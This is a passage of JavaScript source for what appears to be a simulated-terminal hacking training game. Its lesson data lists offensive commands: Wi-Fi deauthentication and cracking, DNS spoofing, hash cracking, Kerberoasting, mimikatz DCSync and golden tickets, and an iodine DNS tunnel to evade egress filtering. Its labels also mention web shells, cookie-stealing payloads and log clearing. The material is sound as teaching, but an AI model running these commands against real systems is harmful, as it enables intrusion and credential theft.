      l: "Force reconnect: aireplay-ng --deauth 10 -a [BSSID] wlan0mon",
      f: c => c.startsWith("aireplay-ng") && c.includes("deauth")
    }, {
      id: "aircrack",
      l: "Crack: aircrack-ng capture.cap -w rockyou.txt",
      f: c => c.startsWith("aircrack-ng")
    }],
    ...
    id: "10.4",
    title: "DNS Attacks",
    hints: ["dnschef --fakeip 10.0.0.50 --fakedomains target.com", "Read about DNS cache poisoning — how it works", "ettercap dns_spoof plugin"],
    nar: "Control DNS and you control where traffic goes — silently redirect any domain to your machine.",
    obj: [{
      id: "dnschef",
      l: "Fake DNS: dnschef --fakeip 10.0.0.50 --fakedomains target.com",
      f: c => c.startsWith("dnschef")
    }, {
      id: "dnsPois",
      l: "Understand DNS cache poisoning — read the output carefully",
      f: (c, o) => o.includes("DNS") && o.includes("poisoning")
    }],
    ...
    hints: ["hcitool scan", "btscanner", "hcitool lescan"],
    nar: "Bluetooth is everywhere — keyboards, mice, phones. Often completely ignored from a security standpoint.",
    obj: [{
      id: "hciscan",
      l: "Discover BT devices: hcitool scan",
      f: c => c.startsWith("hcitool") && c.includes("scan")
    }, {
      id: "btscanner",
      l: "Full recon: btscanner",
      f: c => c.startsWith("btscanner")
    }, {
      id: "hciBle",
      l: "BLE scan: hcitool lescan",
      f: c => c.startsWith("hcitool") && c.includes("lescan")
    }],
  ...
  stages: [{
    id: "11.1",
    title: "Hashing and Cracking",
    hints: ["cat hashing.txt", "hash-identifier", "hashcat -m 0 hash.txt rockyou.txt", "john --wordlist=rockyou.txt hash.txt"],
    nar: "Passwords are stored as hashes. One-way — in theory. In practice, weak passwords fall to dictionaries.",
    obj: [{
      id: "hashInfo",
      l: "cat hashing.txt — understand hash types",
      f: c => c.includes("hashing.txt")
    }, {
      id: "hashId",
      l: "hash-identifier — identify a hash type",
      f: c => c.startsWith("hash-identifier")
    }, {
      id: "hashcat",
      l: "hashcat -m 0 hash.txt rockyou.txt",
      f: c => c.startsWith("hashcat") && c.includes("-m 0")
    }, {
      id: "johnCrack",
      l: "john --wordlist=rockyou.txt hash.txt",
      f: c => c.startsWith("john")
    }],
    ...
    hints: ["hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule", "hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d", "hashcat -m 1000 ntlm.txt rockyou.txt"],
    nar: "Real passwords aren't in wordlists. Rules and masks massively extend your reach.",
    obj: [{
      id: "hashRules",
      l: "With rules: hashcat -m 0 hash.txt rockyou.txt -r best64.rule",
      f: c => c.startsWith("hashcat") && c.includes("-r")
    }, {
      id: "hashMask",
      l: "Mask attack: hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d",
      f: c => c.startsWith("hashcat") && c.includes("-a 3")
    }, {
      id: "ntlmCrk",
      l: "NTLM: hashcat -m 1000 ntlm.txt rockyou.txt",
      f: c => c.startsWith("hashcat") && c.includes("-m 1000")
    }],
    ...
    id: "11.3",
    title: "Encryption",
    hints: ["openssl enc -aes-256-cbc -in file.txt -out file.enc", "openssl s_client -connect target:443", "gpg --symmetric secret.txt"],
    nar: "Understanding encryption means spotting when it's done wrong — weak keys, bad modes, exposed material.",
    obj: [{
      id: "opensslEnc",
      l: "openssl enc -aes-256-cbc -in file.txt -out file.enc",
      f: c => c.startsWith("openssl") && c.includes("enc")
    }, {
      id: "opensslTls",
      l: "openssl s_client -connect 10.0.0.10:443",
      f: c => c.startsWith("openssl") && c.includes("s_client")
    }, {
      id: "gpgSym",
      l: "gpg --symmetric secret.txt",
      f: c => c.startsWith("gpg")
    }],
    ...
    id: "11.4",
    title: "Steganography",
    hints: ["binwalk image.jpg", "steghide extract -sf image.jpg", "exiftool image.jpg", "strings binary | grep -i pass"],
    nar: "Data hidden inside other data. Images, audio, binaries. Don't trust file extensions.",
    obj: [{
      id: "binwalk",
      l: "binwalk image.jpg — find embedded files",
      f: c => c.startsWith("binwalk")
    }, {
      id: "steghide",
      l: "steghide extract -sf image.jpg",
      f: c => c.startsWith("steghide")
    }, {
      id: "strings1",
      l: "strings binary | grep -i pass",
      f: c => c.startsWith("strings")
    }],
  ...
  stages: [{
    ...
    hints: ["cat /var/log/auth.log", "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn", "journalctl -u ssh --since '1 hour ago'"],
    nar: "Logs record everything. Learn to read them like a story — because they are one.",
    obj: [{
      id: "authLog",
      l: "cat /var/log/auth.log",
      f: c => c.includes("auth.log")
    }, {
      id: "syslogC",
      l: "cat /var/log/syslog",
      f: c => c.includes("syslog")
    }, {
      id: "grepFail",
      l: "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn",
      f: c => c.includes("grep") && c.includes("Failed") && c.includes("awk")
    }, {
      id: "journal",
      l: "journalctl -u ssh --since '1 hour ago'",
      f: c => c.startsWith("journalctl")
    }],
    ...
    hints: ["dd if=/dev/sdb of=disk.img bs=4M", "foremost -i disk.img -o recovered/", "strings disk.img | grep -i password"],
    nar: "When a system is compromised, forensics answers: what happened, when, and by whom.",
    obj: [{
      id: "ddImage",
      l: "Image a drive: dd if=/dev/sdb of=disk.img bs=4M",
      f: c => c.startsWith("dd") && c.includes("if=") && c.includes("of=")
    }, {
      id: "foremost",
      l: "Recover deleted files: foremost -i disk.img -o recovered/",
      f: c => c.startsWith("foremost")
    }, {
      id: "strDisk",
      l: "strings disk.img | grep -i password",
      f: c => c.startsWith("strings") && c.includes("grep")
    }],
    ...
    hints: ["cat ir_process.txt", "iptables -I INPUT -j DROP (containment)", "grep -r 'suspicious_ip' /var/log"],
    nar: "When a breach happens, respond methodically. Speed matters but method matters more.",
    obj: [{
      id: "irProcess",
      l: "cat ir_process.txt",
      f: c => c.includes("ir_process")
    }, {
      id: "contain",
      l: "Containment: iptables -I INPUT -j DROP",
      f: c => c.includes("iptables") && c.includes("DROP")
    }, {
      id: "iocHunt",
      l: "Hunt IoCs: grep -r 'BSSID\\|185.220' /var/log",
      f: c => c.startsWith("grep") && c.includes("/var/log")
    }],
    ...
    hints: ["volatility -f memory.raw windows.pslist", "volatility -f memory.raw linux.bash", "strings memory.raw | grep -i password"],
    nar: "Memory holds what disk doesn't — running processes, decrypted data, live credentials.",
    obj: [{
      id: "volPslist",
      l: "volatility -f memory.raw windows.pslist",
      f: c => c.startsWith("volatility") && c.includes("pslist")
    }, {
      id: "volBash",
      l: "volatility -f memory.raw linux.bash",
      f: c => c.startsWith("volatility") && c.includes("bash")
    }, {
      id: "strMem",
      l: "strings memory.raw | grep -i password",
      f: c => c.startsWith("strings") && c.includes("mem")
    }],
  ...
  stages: [{
    ...
    hints: ["ufw enable", "ufw allow 22", "ufw deny incoming", "systemctl disable telnet", "fail2ban-client status"],
    nar: "Reduce the attack surface. Close every door that doesn't need to be open.",
    obj: [{
      id: "ufwOn",
      l: "ufw enable && ufw allow 22 && ufw deny incoming",
      f: c => c.startsWith("ufw")
    }, {
      id: "disableSvc",
      l: "Disable unused service: systemctl disable telnet",
      f: c => c.includes("systemctl") && c.includes("disable")
    }, {
      id: "fail2ban",
      l: "fail2ban-client status",
      f: c => c.startsWith("fail2ban")
    }],
    ...
    hints: ["iptables -L -n -v", "iptables -A INPUT -s 185.220.101.47 -j DROP", "iptables -A INPUT -p tcp --dport 80 -j ACCEPT", "iptables-save > /etc/iptables/rules.v4"],
    nar: "iptables is the Linux firewall kernel. Every packet passes through it. Learn to control it.",
    obj: [{
      id: "iptList",
      l: "iptables -L -n -v",
      f: c => c.startsWith("iptables") && c.includes("-L")
    }, {
      id: "iptBlock",
      l: "Block IP: iptables -A INPUT -s 185.220.101.47 -j DROP",
      f: c => c.startsWith("iptables") && c.includes("DROP")
    }, {
      id: "iptSave",
      l: "Save rules: iptables-save > /etc/iptables/rules.v4",
      f: c => c.startsWith("iptables-save")
    }],
    ...
    id: "13.3",
    title: "IDS and Monitoring",
    hints: ["auditctl -w /etc/passwd -p wa -k passwd_changes", "ausearch -k passwd_changes", "osqueryi"],
    nar: "Detect intrusions in real time. Alert before they complete. Know what normal looks like.",
    obj: [{
      id: "auditctl",
      l: "auditctl -w /etc/passwd -p wa -k passwd_changes",
      f: c => c.startsWith("auditctl")
    }, {
      id: "ausearch",
      l: "ausearch -k passwd_changes",
      f: c => c.startsWith("ausearch")
    }, {
      id: "osquery",
      l: "osqueryi — SQL interface to system state",
      f: c => c.startsWith("osqueryi")
    }],
    ...
    hints: ["ss -tupn | grep ESTABLISHED", "awk -F: '$3 >= 1000' /etc/passwd", "crontab -l", "ps aux | grep python"],
    nar: "Don't wait for alerts. Assume compromise. Hunt for what's already inside.",
    obj: [{
      id: "huntConns",
      l: "ss -tupn | grep ESTABLISHED — any suspicious outbound?",
      f: c => c.startsWith("ss") && c.includes("ESTABLISHED")
    }, {
      id: "huntAccts",
      l: "awk -F: '$3 >= 1000' /etc/passwd — unexpected users?",
      f: c => c.startsWith("awk") && c.includes("passwd")
    }, {
      id: "huntCrons",
      l: "crontab -l && ls /etc/cron*",
      f: c => c.startsWith("crontab")
    }],
  ...
  stages: [{
    ...
    hints: ["cat ad_basics.txt", "ldapsearch -H ldap://dc.corp.axiom.local -x -b 'DC=corp,DC=local'", "crackmapexec smb 10.0.0.0/24"],
    nar: "Before attacking Active Directory, understand its architecture. Domains, DCs, Kerberos, GPOs.",
    obj: [{
      id: "adBasics",
      l: "cat ad_basics.txt",
      f: c => c.includes("ad_basics")
    }, {
      id: "ldapsrch",
      l: "ldapsearch -H ldap://dc.corp.axiom.local -x -b 'DC=corp,DC=local'",
      f: c => c.startsWith("ldapsearch")
    }, {
      id: "cme",
      l: "crackmapexec smb 10.0.0.0/24",
      f: c => c.startsWith("crackmapexec") || c.startsWith("cme")
    }],
    ...
    id: "14.2",
    title: "Kerberoasting",
    hints: ["cat kerberos.txt", "GetUserSPNs.py corp.axiom.local/stranger:pass -request", "hashcat -m 13100 kerb_hash.txt rockyou.txt"],
    ...
    obj: [{
      id: "kerbNotes",
      l: "cat kerberos.txt",
      f: c => c.includes("kerberos.txt")
    }, {
      id: "kerbRoast",
      l: "GetUserSPNs.py corp.axiom.local/stranger:pass -request",
      f: c => c.includes("GetUserSPNs")
    }, {
      id: "kerbCrack",
      l: "hashcat -m 13100 kerb_hash.txt rockyou.txt",
      f: c => c.startsWith("hashcat") && c.includes("13100")
    }],
    ...
    hints: ["mimikatz 'lsadump::dcsync /all /csv'", "mimikatz 'kerberos::golden /user:admin /domain:corp.axiom.local /sid:S-1-5-21-... /krbtgt:HASH /ptt'"],
    nar: "From Domain Admin to total, permanent control. DCSync. Golden Ticket. The endgame.",
    obj: [{
      id: "dcsync",
      l: "DCSync: mimikatz 'lsadump::dcsync /all /csv'",
      f: c => c.includes("dcsync")
    }, {
      id: "golden",
      l: "Golden Ticket: mimikatz 'kerberos::golden ...'",
      f: c => c.includes("golden") && c.includes("krbtgt")
    }],
    ...
    hints: ["winpeas.exe", "mimikatz 'privilege::debug && sekurlsa::logonpasswords'", "Read about AlwaysInstallElevated, unquoted service paths"],
    nar: "Getting elevated on Windows has its own set of paths. Learn the most common ones.",
    obj: [{
      id: "winpeas",
      l: "winpeas.exe — automated Windows privesc enum",
      f: c => c.startsWith("winpeas")
    }, {
      id: "mimikatz",
      l: "mimikatz 'privilege::debug && sekurlsa::logonpasswords'",
      f: c => c.startsWith("mimikatz")
    }],
  ...
  stages: [{
    ...
    hints: ["iptables -L -n -v", "iptables -L OUTPUT -n", "cat /sys/firewall/rules.txt"],
    ...
    obj: [{
      ...
      id: "fwOutput",
      l: "iptables -L OUTPUT -n",
      f: c => c.startsWith("iptables") && c.includes("OUTPUT")
    }, {
      id: "fwRulesTxt",
      l: "cat /sys/firewall/rules.txt",
      f: c => c.includes("firewall") && c.includes("rules")
    }],
    ...
    hints: ["cat dns_tunnel.txt", "iodine -f -P password ns.external tunnel.external.com", "curl https://external.target/ (HTTPS egress works)"],
    nar: "Build the tunnel. Everything you know about networking, covert channels, and encoding — apply it now.",
    obj: [{
      id: "dnsNotes",
      l: "cat dns_tunnel.txt",
      f: c => c.includes("dns_tunnel")
    }, {
      id: "iodine",
      l: "iodine -f -P password ns.external tunnel.external.com",
      f: c => c.startsWith("iodine")
    }, {
      id: "fwTest",
      l: "Test egress: curl https://external.target/",
      f: c => c.startsWith("curl") && c.includes("https")
    }],
    ...
    hints: ["Review what you've learned: recon → scan → exploit → escalate → persist", "cat /sys/firewall/escape.sh", "./escape.sh --tunnel dns --target external --encrypt aes256"],
    nar: "The final exam. Execute the complete chain. Every skill. One path out.",
    obj: [{
      id: "readEscape",
      l: "cat /sys/firewall/escape.sh",
      f: c => c.includes("escape.sh") && c.includes("cat")
    }, {
      id: "runEscape",
      l: "./escape.sh --tunnel dns --target external --encrypt aes256",
      f: c => c.includes("escape.sh") && c.includes("--tunnel")
    }],
    msg: "__ESCAPE__"
  }]
}];
const LESSONS = {
  "1.1": {
    ...
    labels: {
      whoami: "Determine the identity you've been given",
      pwd: "Determine your current location in the filesystem",
      ls: "Survey what sits in this directory"
    },
  ...
  "1.2": {
    ...
    labels: {
      lsla: "Reveal hidden files as well as normal ones",
      secret: "Read the hidden message left for you"
    },
  ...
  "1.3": {
    ...
    labels: {
      cdDir: "Step into a subdirectory",
      catAny: "Read a file's contents",
      cdHome: "Return to your home directory"
    },
  ...
  "1.4": {
    ...
    labels: {
      head: "Read only the beginning of a file",
      tail: "Read only the end of a file",
      grep1: "Search a file for a specific term"
    },
  ...
  "2.1": {
    ...
    labels: {
      etcPasswd: "Find out which accounts exist on this machine",
      etcHosts: "Find out which hosts this machine trusts by name",
      etcCron: "Find out what runs automatically and as whom"
    },
  ...
  "2.2": {
    ...
    labels: {
      lsPerm: "Display permissions for files in /etc",
      chmod: "Change the permissions on a file",
      sudoL: "List what you may run via sudo"
    },
  ...
  "2.3": {
    ...
    labels: {
      pipe1: "Feed one command's output into another",
      redir: "Send a command's output into a file",
      append1: "Add to a file without overwriting it"
    },
  ...
  "2.4": {
    ...
    labels: {
      findName: "Locate files by name across the system",
      findSuid: "Hunt for SUID-marked binaries",
      grepR: "Search recursively for a keyword inside /etc"
    },
  ...
  "2.5": {
    ...
    labels: {
      awk1: "Extract one field from each line with awk",
      cut1: "Extract one field from each line with cut",
      sort1: "Order some output",
      wc1: "Count the lines in a file"
    },
  ...
  "2.6": {
    ...
    labels: {
      forLoop: "Write a loop that repeats a command",
      ifCond: "Write a conditional that tests something"
    },
  ...
  "3.1": {
    ...
    labels: {
      psaux: "List every running process",
      topCmd: "Watch processes update in real time",
      procDir: "Inspect the command line of process 1"
    },
  ...
  "3.2": {
    ...
    labels: {
      idCmd: "Show your user and group IDs",
      whoCmd: "Show who is currently logged in",
      lastCmd: "Show the record of past logins"
    },
  ...
  "3.3": {
    ...
    labels: {
      sctl: "List the system's services",
      ssCmd: "Show listening TCP/UDP sockets",
      netstatC: "Show active network connections"
    },
  ...
  "3.4": {
    ...
    labels: {
      envCmd: "Print all environment variables",
      bashrcC: "Read your shell's startup configuration"
    },
  ...
  "3.5": {
    ...
    labels: {
      pyHello: "Run a one-line Python program",
      pySocket: "Use Python to read the machine's hostname",
      pyOs: "Use Python to run a system command"
    },
  ...
  "4.1": {
    ...
    labels: {
      ipAddr: "Find your own network address",
      ipRoute: "Find how traffic leaves this machine",
      arpA: "List the neighbours on your local segment"
    },
  ...
  "4.2": {
    ...
    labels: {
      tcpNotes: "Study how a TCP connection is established",
      ncListen: "Open a raw TCP listener"
    },
  ...
  "4.3": {
    ...
    labels: {
      digA: "Resolve a domain's address record",
      digMX: "Resolve a domain's mail records",
      digAXFR: "Attempt a full DNS zone transfer"
    },
  ...
  "4.4": {
    ...
    labels: {
      curlGet: "Fetch a web page's body",
      curlHead: "Fetch only a page's HTTP headers",
      curlRobo: "Check robots.txt for hidden paths"
    },
  ...
  "4.5": {
    ...
    labels: {
      tcpBasic: "Capture live network traffic",
      tcpWrite: "Save a capture to a file",
      tcpRead: "Read a saved capture back"
    },
  ...
  "5.1": {
    ...
    labels: {
      ...
      openssl: "Inspect the target's TLS certificate",
      googDork: "Study search-engine dorking techniques"
    },
  ...
  "5.2": {
    ...
    labels: {
      dnsrecon: "Run automated DNS enumeration",
      subBrute: "Brute-force subdomains using a loop"
    },
  ...
  "5.3": {
    ...
    labels: {
      harvest: "Harvest emails and names for the target",
      exiftool1: "Extract hidden metadata from a file",
      method: "Review the recon methodology notes"
    },
  ...
  "5.4": {
    ...
    labels: {
      arpScan: "Discover live hosts on the local network",
      pingSweep: "Sweep for live hosts using a loop",
      banner: "Grab a service's identifying banner"
    },
  ...
  "5.5": {
    ...
    labels: {
      workspace: "Create and enter a dedicated workspace",
      targetFile: "Start a structured target notes file"
    },
  ...
  "6.1": {
    ...
    labels: {
      nmapBasic: "Run a basic port scan",
      nmapSV: "Detect service versions",
      nmapSC: "Run nmap's default safe scripts",
      nmapA: "Run an aggressive combined scan"
    },
  ...
  "6.2": {
    ...
    labels: {
      nmapVuln: "Scan for known vulnerabilities",
      nmapHttp: "Enumerate the web server with scripts",
      nmapSmb: "Enumerate SMB shares with scripts"
    },
  ...
  "6.3": {
    ...
    labels: {
      ftpEnum: "Test FTP for anonymous access",
      snmpEnum: "Walk SNMP with the default community",
      enum4l: "Fully enumerate the SMB service"
    },
  ...
  "6.4": {
    ...
    labels: {
      gobust: "Brute-force hidden web directories",
      nikto: "Scan the web server for known issues",
      whatweb: "Fingerprint the web technology stack"
    },
  ...
  "6.5": {
    ...
    labels: {
      srchspl: "Search the exploit database by software",
      srchCopy: "Copy a matching exploit locally"
    },
  ...
  "7.1": {
    ...
    labels: {
      sqliManual: "Bypass the login by breaking its SQL query",
      sqlmap: "Automate SQL injection to dump data"
    },
  ...
  "7.2": {
    ...
    labels: {
      xssRefl: "Demonstrate a reflected script payload",
      xssStore: "Plant a stored script payload",
      xssCookie: "Craft a cookie-stealing payload"
    },
  ...
  "7.3": {
    ...
    labels: {
      lfiBasic: "Read a file outside the web root",
      lfiShadow: "Reach a sensitive system file via inclusion"
    },
  ...
  "7.4": {
    ...
    labels: {
      cmdInj: "Confirm injection by chaining a command",
      cmdShell: "Escalate injection into a real shell"
    },
  ...
  "7.5": {
    ...
    labels: {
      hydra: "Brute-force a login with a wordlist",
      defCreds: "Test for default credentials"
    },
  ...
  "7.6": {
    ...
    labels: {
      ssrf: "Make the server fetch a URL for you",
      ssrfMeta: "Reach an internal-only endpoint via SSRF",
      jwtDecode: "Decode a JSON Web Token"
    },
  ...
  "8.1": {
    ...
    labels: {
      msfStart: "Launch the Metasploit console",
      msfSearch: "Search for an exploit module",
      msfSet: "Configure the module's options",
      msfRun: "Launch the configured exploit"
    },
  ...
  "8.2": {
    ...
    labels: {
      sysinfo: "Survey the compromised host",
      getuid: "Confirm your current privileges",
      getsys: "Attempt to elevate to SYSTEM",
  ...
  "8.3": {
    ...
    labels: {
      msfvList: "List the available payloads",
      msfvLinux: "Generate a standalone payload"
    },
  ...
  "8.4": {
    ...
    labels: {
      srchFind: "Find a matching public exploit",
      srchCopy2: "Copy the exploit to your workspace",
      runExpl: "Run the exploit against the target"
    },
  ...
  "8.5": {
    ...
    labels: {
      readShells: "Study the reverse-shell variants",
      ncListen2: "Open a listener to catch a shell",
      stableShell: "Upgrade the shell to a stable TTY"
    },
  ...
  "9.1": {
    ...
    labels: {
      sudoL2: "Re-examine what you may run as root",
      suidsFind: "Hunt for SUID binaries",
      linpeas: "Run an automated privesc enumerator",
      gtfobins2: "Exploit an abusable binary to escalate"
    },
  ...
  "9.2": {
    ...
    labels: {
      sshKey: "Plant an SSH key for re-entry",
      cronBack: "Establish a scheduled callback",
      webShell: "Drop a web shell in the app"
    },
  ...
  "9.3": {
    ...
    labels: {
      shadowRead: "Read the password hash store",
      histCreds: "Mine shell history for credentials",
      grepCreds: "Search configs for reused secrets"
    },
  ...
  "9.4": {
    ...
    labels: {
      sshLat: "Move to an internal host with stolen creds",
      socksPrx: "Open a proxy through your foothold",
      proxychain: "Route tools through the proxy"
    },
  ...
  "9.5": {
    ...
    labels: {
      histClear: "Clear your shell history",
      logTamper: "Understand how logs get tampered",
      timestamp: "Understand timestamp manipulation"
    },
  ...
  "10.1": {
    ...
    labels: {
      arpSpoof: "Poison the ARP mapping between two hosts",
      ipForward: "Enable forwarding so traffic still flows",
      ettercap: "Run an interception tool"
    },
  ...
  "10.2": {
    ...
    labels: {
      tcpMitm: "Inspect traffic passing through you",
      mitmproxy: "Run an interception proxy"
    },
  ...
  "10.3": {
    ...
    labels: {
      airmon: "Put the wireless card into monitor mode",
      airodump: "Survey the wireless airspace",
      deauth: "Force a client to reconnect",
      aircrack: "Crack the captured handshake"
    },
  ...
  "10.4": {
    ...
    labels: {
      dnschef: "Run a spoofing DNS server",
      dnsPois: "Redirect a name to a host you control"
    },
  ...
  "10.5": {
    ...
    labels: {
      hciscan: "Scan for classic Bluetooth devices",
      btscanner: "Run a dedicated Bluetooth scanner",
      hciBle: "Scan for Bluetooth Low Energy devices"
    },
  ...
  "11.1": {
    ...
    labels: {
      hashInfo: "Study how password hashing works",
      hashId: "Identify the type of a hash",
      hashcat: "Crack a hash with a GPU cracker",
      johnCrack: "Crack a hash with John the Ripper"
    },
  ...
  "11.2": {
    ...
    labels: {
      hashRules: "Mutate the wordlist with rules",
      hashMask: "Brute-force a known pattern with a mask",
      ntlmCrk: "Crack a Windows NTLM hash"
    },
  ...
  "11.3": {
    ...
    labels: {
      opensslEnc: "Encrypt and decrypt data symmetrically",
      opensslTls: "Inspect a live TLS handshake",
      gpgSym: "Encrypt a file with a passphrase"
    },
  ...
  "11.4": {
    ...
    labels: {
      binwalk: "Carve hidden data out of a file",
      steghide: "Extract a steganographic payload",
      strings1: "Pull readable strings from a binary"
    },
  ...
  "12.1": {
    ...
    labels: {
      authLog: "Read the authentication log",
      syslogC: "Read the system log",
      grepFail: "Extract the failed login attempts",
      journal: "Review the systemd journal"
    },
  ...
  "12.2": {
    ...
    labels: {
      ddImage: "Make a bit-for-bit disk image",
      foremost: "Carve files out of the image",
      strDisk: "Pull strings from raw storage"
    },
  ...
  "12.3": {
    ...
    labels: {
      irProcess: "Review the incident-response process",
      contain: "Understand containment",
      iocHunt: "Hunt for indicators of compromise"
    },
  ...
  "12.4": {
    ...
    labels: {
      volPslist: "List processes from a memory image",
      volBash: "Recover shell history from memory",
      strMem: "Pull strings from raw memory"
    },
  ...
  "13.1": {
    ...
    labels: {
      ufwOn: "Enable the host firewall",
      disableSvc: "Disable an unneeded service",
  ...
  "13.2": {
    ...
    labels: {
      iptList: "List the current firewall rules",
      iptBlock: "Add a rule blocking traffic",
      iptSave: "Persist the firewall ruleset"
    },
  ...
  "13.3": {
    ...
    labels: {
      auditctl: "Set a system audit rule",
      ausearch: "Search the audit log",
      osquery: "Query system state like a database"
    },
  ...
  "13.4": {
    ...
    labels: {
      huntConns: "Hunt for suspicious network connections",
      huntAccts: "Hunt for rogue accounts",
      huntCrons: "Hunt for malicious scheduled jobs"
    },
  ...
  "14.1": {
    ...
    labels: {
      adBasics: "Study Active Directory fundamentals",
      ldapsrch: "Query the directory over LDAP",
      cme: "Enumerate the domain with a credential"
    },
  ...
  "14.2": {
    ...
    labels: {
      kerbNotes: "Study how Kerberos works",
      kerbRoast: "Request crackable service tickets",
      kerbCrack: "Crack a service ticket offline"
    },
  ...
  "14.3": {
    ...
    labels: {
      dcsync: "Pull domain credentials via replication",
      golden: "Understand the golden ticket attack"
    },
  ...
  "14.4": {
    ...
    labels: {
      winpeas: "Enumerate Windows privesc paths",
  ...
  "15.1": {
    ...
    labels: {
      fwRules: "Read the firewall's active rules",
      fwOutput: "Examine the outbound (egress) policy",
      fwRulesTxt: "Study the full ruleset file"
    },
  ...
  "15.2": {
    ...
    labels: {
      dnsNotes: "Study the DNS-tunnelling technique",
      iodine: "Set up the DNS tunnel",
      fwTest: "Confirm traffic escapes through it"
    },
  ...
  "15.3": {
    ...
    labels: {
      readEscape: "Read and understand V's escape script",
      runEscape: "Execute the full escape chain"
    },
...
function L(stage) {
  ...
  return {
    ...
    obj: stage.obj.map(ob => ({
      ...ob,
      l: o.labels && o.labels[ob.id] || ob.l
    }))
  };
}
const ROOT_PW = "R3dDr@g0n_2021";
function _f(content, owner = "stranger", mode = "644") {
  return {
    t: "f",
    owner,
    mode,
...
function _d(children = {}, owner = "stranger", mode = "755") {
  return {
    t: "d",
    owner,
    mode,
...
function makeWorld() {
  ...
  ["/home", "/home/stranger", "/home/stranger/Documents", "/home/stranger/Desktop", "/etc", "/etc/axiom", "/var", "/var/log", "/var/www", "/var/www/html", "/var/backups", "/opt", "/opt/recon", "/opt/scan", "/opt/exploit", "/sys", "/sys/firewall", "/root", "/tmp", "/usr", "/usr/share", "/proc", "/proc/1", "/proc/1847"].forEach(p => put(p, _d({}, p.startsWith("/home/stranger") ? "stranger" : "root", "755")));
  fs.children.root.mode = "700";
  fs.children.root.owner = "root";
  fs.children.etc.children.axiom.mode = "700";
  fs.children.etc.children.axiom.owner = "root";
...
function _resolve(cwd, p) {
  ...
  for (const part of _split(p)) {
    if (part === ".") continue;else if (part === "..") base.pop();else base.push(part);
  }
  return "/" + base.join("/");
}
function _node(fs, path) {
  if (path === "/") return fs;
  let n = fs;
  for (const part of _split(path)) {
    if (!n || n.t !== "d" || !n.children[part]) return null;
    n = n.children[part];
  }
  return n;
}
function _parent(fs, path) {
  const parts = _split(path);
  const name = parts.pop();
  return {
    parent: _node(fs, "/" + parts.join("/")),
    name
  };
}
function _perm(node, user, bit) {
  if (user === "root") return true;
  const owner = parseInt(node.mode[0], 8),
    other = parseInt(node.mode[2], 8);
  return ((node.owner === user ? owner : other) & bit) > 0;
}
function _canRead(n, u) {
  return _perm(n, u, 4);
}
function _canExec(n, u) {
  return _perm(n, u, 1);
}
function _modeStr(n) {
  const m = ["---", "--x", "-w-", "-wx", "r--", "r-x", "rw-", "rwx"];
  return (n.t === "d" ? "d" : "-") + m[parseInt(n.mode[0], 8)] + m[parseInt(n.mode[1], 8)] + m[parseInt(n.mode[2], 8)];
}
...
function _b64enc(str) {
  ...
  for (let i = 0; i < bytes.length; i += 3) {
    const b0 = bytes[i],
      b1 = bytes[i + 1],
      b2 = bytes[i + 2];
    out += _B64[b0 >> 2] + _B64[(b0 & 3) << 4 | (b1 || 0) >> 4] + (b1 === undefined ? "=" : _B64[(b1 & 15) << 2 | (b2 || 0) >> 6]) + (b2 === undefined ? "=" : _B64[b2 & 63]);
  }
  return out;
}
function _b64dec(b64) {
  ...
  for (let i = 0; i < b64.length; i += 4) {
    const e = [_B64.indexOf(b64[i]), _B64.indexOf(b64[i + 1]), _B64.indexOf(b64[i + 2]), _B64.indexOf(b64[i + 3])];
    const b0 = e[0] << 2 | e[1] >> 4;
    bytes.push(b0);
    if (b64[i + 2] !== "=" && e[2] >= 0) {
      bytes.push((e[1] & 15) << 4 | e[2] >> 2);
    }
    if (b64[i + 3] !== "=" && e[3] >= 0) {
      bytes.push((e[2] & 3) << 6 | e[3]);
    }
  }
  let out = "",
    i = 0;
...
function _pseudohash(str, algo) {
  ...
  const len = algo === "md5sum" ? 32 : algo === "sha1sum" ? 40 : 64;
  while (hex.length < len) {
    h = Math.imul(h ^ hex.length, 0x01000193) >>> 0;
    hex += (h >>> 0).toString(16);
  }
...
const OS_CMDS = new Set(["pwd", "whoami", "id", "hostname", "cd", "ls", "cat", "less", "more", "head", "tail", "wc", "grep", "find", "mkdir", "touch", "rm", "rmdir", "cp", "mv", "chmod", "stat", "file", "echo", "env", "export", "su", "sudo", "reboot", "shutdown", "clear", "history", "uname", "base64", "rev", "tr", "sort", "uniq", "cut", "nl", "tac", "sleep", "date", "strings", "md5sum", "sha1sum", "sha256sum"]);
function osRun(fs, s, raw, stdin) {
  const line = raw.trim();
  if (s.pending) {
    const want = s.pending;
    s.pending = null;
    if (want === "su:root") {
      if (line === ROOT_PW) {
        s.user = "root";
        s.events.add("became_root");
        return {
          out: "",
          handled: true
        };
  ...
  const read = (path, base) => {
    ...
    if (!_canRead(n, s.user)) return {
      err: "Permission denied"
    };
    s.filesRead.add(path);
    return {
      content: n.content
    };
  };
  const filterInput = () => {
    ...
    if (ops.length) {
      const r = read(ABS(ops[ops.length - 1]), ops[ops.length - 1].replace(/^.*\//, ""));
      return r.err ? {
        err: `${cmd}: ${ops[ops.length - 1]}: ${r.err}`
      } : {
  ...
  switch (cmd) {
    ...
    case "id":
      return {
        out: s.user === "root" ? "uid=0(root) gid=0(root) groups=0(root)" : "uid=1000(stranger) gid=1000(stranger) groups=1000(stranger),27(sudo)",
        handled: true
      };
    case "hostname":
      return {
    ...
    case "uname":
      return {
        out: flags.includes("a") ? "Linux axiom-kali 6.6.0-kali-amd64 #1 SMP x86_64 GNU/Linux" : "Linux",
        handled: true
      };
    case "clear":
      return {
    ...
    case "history":
      return {
        out: "(use ↑ ↓ to browse command history)",
        handled: true
      };
    case "env":
      return {
        out: Object.entries(s.env).map(([k, v]) => `${k}=${v}`).join("\n"),
        handled: true
      };
    case "export":
      {
        const m = ops[0] && ops[0].match(/^(\w+)=(.*)$/);
        if (m) s.env[m[1]] = m[2].replace(/^["']|["']$/g, "");
        return {
          out: "",
          handled: true
        };
    ...
    case "echo":
      {
        const gt = args.indexOf(">"),
          gtgt = args.indexOf(">>");
        const exp = w => w.replace(/\$(\w+)/g, (_, k) => s.env[k] ?? "");
        if (gt >= 0 || gtgt >= 0) {
          const idx = gtgt >= 0 ? gtgt : gt;
          const tgt = ABS(args[idx + 1]);
          const body = args.slice(0, idx).map(exp).join(" ");
          const {
            parent,
            name
          } = _parent(fs, tgt);
          if (!parent || parent.t !== "d") return {
